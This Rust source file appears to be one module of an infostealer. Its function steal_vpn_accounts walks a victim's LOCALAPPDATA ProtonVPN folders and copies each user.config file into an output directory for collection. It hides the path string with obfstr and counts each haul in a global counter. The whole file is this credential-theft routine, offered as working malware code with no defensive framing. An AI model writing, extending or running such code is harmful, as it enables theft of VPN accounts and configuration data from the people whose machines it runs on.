use std::collections::HashMap;

pub fn steal_vpn_accounts(path_out: String) -> Option<String>{

    let mut vpns: HashMap<String, (String, String)> = HashMap::new();

    vpns.insert("ProtonVPN".to_string(), (format!("{}\\{}", std::env::var("LOCALAPPDATA").unwrap(), obfstr::obfstr!("ProtonVPN\\")), "user.config".to_string()));

    for (name, (path, file_search)) in vpns {

        if !std::path::Path::new(&path.clone()).exists() {
            continue;
        }

        let mut read_dir = match std::fs::read_dir(path.clone()) {
            Ok(read_dir) => read_dir,
            Err(_) => continue,
        };

        for file in read_dir {

            if file.is_err() {
                continue;
            }

            let file = file.unwrap();

            if !file.metadata().unwrap().is_dir() {
                continue;
            }

            let path_concat = format!("{}\\{}", file.path().to_str().unwrap(), file_search);

            if !std::path::Path::new(&path_concat).exists() {
                continue;
            }

            // create folder in output with vpn name
            let _ = std::fs::create_dir(format!("{}\\{}", path, name));
            let _ = std::fs::copy(path_concat, format!("{}\\{}\\{}", path_out, name, file_search));

            unsafe {
                crate::OTHERS += 1;
            }

        }

    }

   Some(String::new())

}